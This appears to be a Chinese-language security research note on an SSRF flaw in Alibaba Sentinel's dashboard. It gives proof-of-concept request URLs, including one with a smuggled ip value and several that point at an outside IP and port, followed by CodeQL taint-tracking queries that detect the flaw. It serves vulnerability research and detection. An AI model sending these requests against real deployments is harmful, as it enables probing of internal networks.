# Sentinel

随着微服务的流行，服务和服务之间的稳定性变得越来越重要。Sentinel 是面向分布式服务架构的**轻量级**流量控制产品，主要以流量为切入点，从流量控制、熔断降级、系统负载保护等多个维度来帮助您保护服务的稳定性。

[介绍](https://blog.csdn.net/u012190514/article/details/81383698)

## SSRF

https://github.com/alibaba/Sentinel/issues/2451

## source

![image-20220102190441213](https://user-images.githubusercontent.com/63966847/147877579-bc3f1a6c-e274-409e-98e3-401259ca6815.png)


![image-20220102190456538](https://user-images.githubusercontent.com/63966847/147877583-77e3152f-c4d8-4fd1-bd4f-8e1775df54bf.png)


## sink

![image-20220102190519809](https://user-images.githubusercontent.com/63966847/147877588-ff6b13b7-d192-4913-a419-e3044634df93.png)

exp

```
http://127.0.0.1:8080/registry/machine?app=SSRF-TEST&appType=0&version=0&hostname=TEST&ip=localhost:12345%23&port=0
```

## codeql

使用污点分析

其他ssrf不过需要登录。

```
http://127.0.0.1:8080/cluster/state_single?ip=1.116.136.120&port=3333&app=test

http://127.0.0.1:8080/authority/rules?ip=1.116.136.120&port=3333&app=test

http://127.0.0.1:8080/v1/flow/rules?ip=1.116.136.120&port=3333&app=test

http://127.0.0.1:8080/paramFlow/rules?ip=1.116.136.120&port=3333&app=test

http://127.0.0.1:8080/resource/machineResource.json?ip=1.116.136.120&port=3333&app=test

http://127.0.0.1:8080/system/rules.json?ip=1.116.136.120&port=3333&app=test

http://127.0.0.1:8080/gateway/api//list.json?ip=1.116.136.120&port=3333&app=test
```

因为能力有限只能分开弄

```java
/**
 * @id Sentinel
 * @name Ssrf
 * @description Ssrf
 * @kind path-problem
 * @problem.severity warning
 */

import java
import semmle.code.java.dataflow.TaintTracking
import semmle.code.java.dataflow.FlowSources
import semmle.code.java.security.QueryInjection
import DataFlow::PathGraph



class SsrfConfig extends TaintTracking::Configuration {
  SsrfConfig() { this = "SsrfConfig" }

  override predicate isSource(DataFlow::Node src) { 
    src instanceof RemoteFlowSource
  }//默认参数

  override predicate isSink(DataFlow::Node sink) {
    exists(//触发set ip操作
      Parameter p | p = sink.asParameter() and p.getCallable().getName() = "setIp" and p.getName() = "ip"
  )
  }
}

from SsrfConfig config, DataFlow::PathNode source, DataFlow::PathNode sink
where config.hasFlowPath(source, sink)
select source.getNode(), source, sink, "source"
```

```java
import java
    
from MethodAccess call, Method method, DataFlow::Node src
where method.hasName("setIp") and method.getDeclaringType().getAnAncestor().hasQualifiedName("com.alibaba.csp.sentinel.dashboard.discovery", "MachineInfo") and call.getMethod() = method and src instanceof RemoteFlowSource 
select call
```
---------------------------------------------------------------------------------
更新 2021/1/3

让safe6sec师傅看了看，师傅说sink点需要是危险的地方，之前的setip不能这样。

和师傅讨论弄了一下午加一晚上终于弄出来了(主要是safe6sec师傅在弄 hhhh

感谢safe6sec师傅

```ql
/**
 * @id Sentinel
 * @name Ssrf
 * @description Ssrf
 * @kind path-problem
 * @problem.severity warning
 */

import java
import semmle.code.java.dataflow.TaintTracking
import semmle.code.java.dataflow.FlowSources
import DataFlow::PathGraph

//连接setip到getip
predicate isTaintedString(Expr expSrc, Expr expDest) {
  exists(Method method1,Method method2, MethodAccess call1,MethodAccess call2|
    method1.getName()="setIp" and call1.getMethod() = method1 and expSrc = call1.getAnArgument()//获得setip方法的参数
    and
    method2.getName()="getIp" and call2.getMethod() = method2 and expDest = call2 
    )
}

class SsrfConfig extends TaintTracking::Configuration {
  SsrfConfig() { this = "SsrfConfig" }

  override predicate isSource(DataFlow::Node src) { 
    src instanceof RemoteFlowSource//默认的
   }

   //sink 
	override predicate isSink(DataFlow::Node sink) {
	   exists(ConstructorCall call, Class clz| 
		call.getAnArgument() = sink.asExpr()
		and call.getConstructedType()=clz 
		and clz.getName()="HttpGet"
		)
  }

  override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) {
    isTaintedString(node1.asExpr(), node2.asExpr())
  }

}

from SsrfConfig config, DataFlow::PathNode source, DataFlow::PathNode sink
where config.hasFlowPath(source, sink)
select source.getNode(), source, sink, "source"

// from Method method1,MethodAccess call1,DataFlow::Node expSrc
// where method1.getName()="setIp" and call1.getMethod() = method1 and expSrc.asExpr() = call1.getAnArgument()
// select call1,expSrc,call1.getAnArgument(),1
```

![image](https://user-images.githubusercontent.com/63966847/147954723-35bcda60-b9d3-403a-8178-8998bd79049f.png)

